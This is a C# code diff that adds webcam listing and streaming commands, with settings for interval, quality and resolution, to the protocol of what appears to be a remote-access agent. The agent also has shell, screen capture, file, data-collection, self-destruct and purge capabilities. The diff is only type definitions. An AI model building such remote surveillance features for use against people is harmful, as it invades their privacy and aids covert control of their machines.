@@ -49,6 +49,9 @@ public enum V2CommandOperation
     UploadFile,
     ScreenStart,
     ScreenStop,
+    CameraList,
+    CameraStart,
+    CameraStop,
     ShellOpen,
     ShellClose,
     StartCollection,
@@ -536,6 +539,21 @@ public sealed class V2ScreenStartRequest
     public int IntervalMs { get; set; } = 1000;
 }
 
+public sealed class V2CameraInfo
+{
+    public int Index { get; set; }
+    public string Name { get; set; } = "";
+}
+
+public sealed class V2CameraStartRequest
+{
+    public int CameraIndex { get; set; }
+    public int Quality { get; set; } = 70;
+    public int IntervalMs { get; set; } = 250;
+    public int Width { get; set; } = 1280;
+    public int Height { get; set; } = 720;
+}
+
 public sealed class V2AgentStatus
 {
     public string AgentId { get; set; } = "";
@@ -609,7 +627,7 @@ public static class V2Capabilities
 {
     public static readonly string[] All =
     {
-        "sysinfo", "process", "terminal", "files", "screen", "collection.t0",
+        "sysinfo", "process", "terminal", "files", "screen", "camera", "collection.t0",
         "collection.t1", "collection.t2", "selfdestruct", "purge",
     };
 }
